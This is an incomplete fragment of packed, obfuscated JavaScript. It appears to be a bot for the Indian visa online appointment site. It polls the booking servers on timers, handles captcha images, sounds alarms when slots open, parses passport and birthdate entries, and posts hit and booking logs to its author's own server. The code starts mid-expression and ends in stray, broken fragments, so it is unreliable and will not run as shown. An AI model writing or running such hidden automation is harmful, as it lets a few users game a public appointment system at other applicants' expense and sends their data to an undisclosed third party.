3D=[];1g.1t(f(6b){3D=3D.9a(6b)});4G(1I,3D)}});$(\'<3k M="99">\').h($(\'.3E\'));u 3e=$(\'[S=3a]\');t(3e.m>1)3e.2D(3e.m-1).98(f(){3e.2D(0).2j()});D.39=f(){u 37=[];D.2U.m&&$.2l(1I+\'3q/3n/8X\',{1W:2x.2w(D.2U)});6h(u z 2k D.2B)37.16(D.2B[z]);37.m&&$.2l(1I+\'3q/3n/8Q\',{Y:2x.2w(37)}).2C(f(){37.1t(f(a){8V D.2B[a.1v]})});D.2U=[];6j(D.4p);D.4p=1x(D.39,1*6r)};D.2U=[];D.2B={};D.4p=1x(D.39,1*6r);1x(f(){u 3Q=21,1L=$(\'#4k\'),6d=$(\'<4M>\').F({1p:"4O:4J"}).L().h(\'1k\');$(\'<Z>\').h(1L).A(\'12\').p(\'3N t I 8T 8S\').K(f(){t(1S.m)$.4L(1S[0].2H).2C(f(r){D.8U=r;t(r.1O(\'6k.8W-8R.4o/8L\'))2y(\'4a 4q 1U 5X, 8K 8M 6v 4q 8N 8P 8O 8Y.\');1l t(3Q){3Q=1e;5Y.1t(f(a,i){1x(f(){t(!D.96)6d.F({1p:"1C://"+a.1z})},i*60*2a)})}1l 2y(\'4a 4q 1U 4l 5X 4e\')})}).K()},2a)});(f(){t(3P.2g!=\'1C://2N.2O.2k/2n/\'&&3P.2g!=\'1C://2N.2O.2k/2n/95.p\'&&3P.2g!=\'1C://2N.2O.2k/2n/2o.23\')H;t(D.61)H;D.61=1;$(f(){u 1k=$(\'1k\'),41,4C,4N,3M,6u,2S,2W,4B,27;41=$(\'<P>\').A(\'90\').h(1k);2S=$(\'<P>\').h(41).L();2W=$(\'<8Z>\').F({6t:\'91 6v 1j 6a\'}).A(\'92\').h(2S);4B=2W.1T().F({6y:\'6y\',6t:\'4a 8q 1j 8r 8s 6a\'}).h(2S);4d=$(\'<P>\').F({3U:\'4k\'}).h(41);$(\'<Z>\').h(4d).A(\'12\').p(\'1V 8n\').K(f(){2S.8m();27.8h()});27=$(\'<1q>\').h(4d).L();4C=$(\'<3k M="12">\').A(\'8i\').J(\'8j-\').h(27);4N=$(\'<1q>\').h(27);3M=$(\'<Z>\').h(27).A(\'12\').p(\'8l\');6u=$(\'<Z>\').h(27).A(\'12\').p(\'8D 1V\').K(f(){2W.J(2x.2w(1g));3M.K()});3M.K(f(){u 1M=2W.J().4m();1M=1M.R(/[^\\/\\w\\s]|2i/g,\' \').R(/\\s+/g,\' \').R(/^\\s|\\s$/g,\'\');1M=1M.R(/([^\\d])(\\d)\\//g,\'$10$2/\').R(/\\/(\\d)\\//g,\'/0$1/\').R(/(1V[4E]\\w{0,7})\\s+/g,\'$1\');1m=(1M.1O(/(.+?) (1V[4E]\\w{8}) (\\d\\d\\/\\d\\d\\/\\d\\d\\d\\d) (\\w+)\\s*/g)||[]).3X(f(a){u 3S=a.1O(/(.+?) (1V[4E]\\w{8}) (\\d\\d\\/\\d\\d\\/\\d\\d\\d\\d) (\\w+)\\s*/).32(1);3S[0]=4C.J()+3S[0].R(/^[\\s\\d]+/,\'\');H 3S});1M=2x.2w(1m).32(1,-1).R(/],/g,\'],\\n\')+\',\\n\';4B.J(1M);4N.p(1M.1O(/1V/g).m+\'->\'+1m.m)});t(!D.5V)$(\'<4z>\').F({5b:\'4Z\',M:\'12/E\',2g:4H+\'1p/E/52.E?2i=\'+53.50()}).h(\'8H\')});$(f(){u 1L=$(\'#4k\'),2Q,3W,4P,3Y,2R,3V,3Z,3R=2P,4x=2P,4X=\'2o.23\';f 4e(){u 24=2m 1f();H(24.8B()+\':\'+24.8w()+\':\'+24.8v()).R(/^(\\d:)/,\'0$1\').R(/:(\\d):/,\':0$1:\').R(/:(\\d)$/,\':0$1\')};f 3O(4b){$.4L(4X).2C(f(r){3Z.5d(\'x\');r=!!r.1O(\'4R\');4P.p(\'8A \'+(r?\'9Q\':\'5H\')+\'::\'+4e()).E({Q:r?\'1D\':\'1w\'});4b&&4b(r)});3Z.A(\'x\')};f 5h(){3O(f(r){t(r==4x)H;2R.K();3W.9N();3V.2c()})};2Q=$(\'<2Q>\').9P({9O:21}).3L($(\'<9o>\').F({M:\'2Q/9t\',1p:\'1C://9u.4o/9v/9F%9I.9K\'})).L().h(1L);3W=2Q.4L(0);4P=$(\'<Z>\').h(1L).A(\'12\').p(\'3N 9D\').K(f(){3O()});3Y=$(\'<Z>\').h(1L).E({Q:\'1D\'}).A(\'12\').p(\'5w 3N 5o\').K(f(){3Y.L();2R.2c();3O(f(a){4x=a;3R=6V(5h,a?7g:7d)})});2R=$(\'<Z>\').h(1L).E({Q:\'1w\'}).A(\'12\').p(\'4j 3N 5o\').K(f(){3Y.2c();2R.L();3R&&7i(3R)}).L();3V=$(\'<Z>\').h(1L).A(\'12\').E({Q:\'1w\'}).L().p(\'4j 7X\').K(f(){3V.L();3W.8d()});3Z=$(\'<P>\').A(\'3T 9d\').h(1L)})})();', 62, 615, '|||||||||||||||function||appendTo|||||length|||html|caps|||if|var||||||addClass|pr|II|window|css|attr|usr|return||val|click|hide|type|used|bgd|div|color|replace|name|form|ready|count|hnd|find|taken|button|||text||el|slug|push|rpane|||res|remove|hbgd|hitf|false|Date|IDS|wait|tr|BGDs|body|else|bgds|list|sts|src|span|_img|iform|forEach|_wait|fileno|red|setTimeout|_xhr|domain|on|live|http|green|tag|zcc|trdl|look|base|xdt|xhr|bdiv|str|data|match|icont|Taken|rsp|servers|clone|is|BGD|hits|kaps|cap|_imgn||true|image|jsp|dt|keyCode|trds|hspan|tabIndex||1000|height|show|cbut|ndl|table|href|pstr|_|focus|in|post|new|visa|Reprint|img|iij|removeAttr|auto|width|insertAfter|closest|stringify|JSON|alert|pframe|loaded|takens|done|eq|trt|capy|while|appurl|capx|_wimg|kase|_usr|getapp|indianvisaonline|gov|null|audio|stoptimer|tdiv|submit|hitlogs|Msgbx|T0|abc|msgbx|server|links||slice|nw|curfile|shift|case|tkns||fireUpdater|ImgNum|DATE|break|_tmh|zz|ihit|success|td|itbl|lkase|input|genhit|mstr|logger|frame|ichk|viz|Appointment|busy|emss|today|top|esrc|base64|Access|xpiry|100|tkn|bstr|oids|mainframe|passport_no|birthdate|bells|children|scrp|sleep|append|fbut|Check|check_stat|location|first|checker|ra|loader|id|stopring|ring|map|starttimer|cwait||bfdiv|cfile|ibody|gif|Success|egtd|lbgd||oprs|Your|cb|fillgaps|btndiv|now|step|abort|imgsrc|option|Stop|bottomdiv|not|toUpperCase|zform|com|uptimer|IP|fadeIn|msdv|align|200|showcap|framecont|curstate|contents|link|fail|T1|pinp|getTime|DCR|nbsp|setupFallback|BU|msk|blank|showMess|get|iframe|rspan|about|statusdiv|tframe|BGDD1|already|mytreedb|fetchimage|task|solid|url|pop|stylesheet|random|Used|style|Math|duration|time|Expired|||IncorrectFile|No|rel|code|removeClass|delay|Striker|bdtx|ckrfun|next|textAlign|needles|pre|NO|prependTo|Timer|center|fontSize|360|1px|C0C0C0|load|border|Start|ipdf|20px|SAVE|hidden|lli|each|bgdlist|allow|bgname|gray|Closed|jpeg|orange|info|tbody|R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw|ReprintAppt|appt|target|rightpane|Code|caption|ex|min|styled|should|blocked|hitservers|bold||bset|aset|Error||Server|Internal|102|toggle|setupBlock|here|ids|max|efrm|msg|len|fontWeight|for|filter|clearTimeout|www|net|long|letters|jubayer|site40|be|60000|capimage|placeholder|ebut|your|keypress|iholder|readonly|alt|OnlineForm|add|The|onclick|Confirm|checked|plain|charset|user|defined|overrideMimeType|EXIT|2014|open|GET|07|XMLHttpRequest|onchange|empty|prev|run|setInterval|value|ndate|ndttr|pages||ip|nest|php|ztr|BGDD0|V1|mission|last|select|BANGLADESH|action|pia|5000|script|headera|10000|hiderow|clearInterval|responseText|are|available|Dates|Apppointment|Under|exists|Invalid|an|valid|Print|Registered|application|There|Maintenance|System|Birth|File|Number|of|or|within|only|maintenance|under|does|New|possible|Opened|checkbox|sandbox|forms|container|48px|fromCharCode|String|status|same|example|onsubmit|Alarm|origin|onload|charCodeAt|10px|parent|ajax_loader_blue_32|Not|uploads|PDF|send|vertical|middle|margin|0xff|btoa|pause|onerror|Hits|started|fadeToggle|prename|PRE|8681|Format|slideToggle|Formatter|Avoided|Duplicate|formatted|will|appear|8679|blue|getSeconds|getMinutes|switch|always|hit|BGDD|getHours|unshift|Get|Refill|00A|big|head|Online|onkeyup|Please|resources|change|by|the|reconnecting|logtaken|hosting|Blocked|am|myres|delete|main|loghit|modem|textarea|bottomspace|Paste|itext|6789|logbgd|index|nohit||blur|radio|concat|typeof|splice|ck|Rimage|rep|allot|129|164|dom|dip|allotmentsave|Thread|Ready|source|V2|Waiting|Threads|Limit|mpeg|soundjax|reddo|scrollTop|318|500|animate|1200|embed|plugin|Status|nextAll|97744|keydown|GETAPPT|5EALARM|497|mp3|autocomplete|150|play|loop|prop|Open|off|logcaps|header|sort'.split('|')))

}(
            console.log("abc")
))




});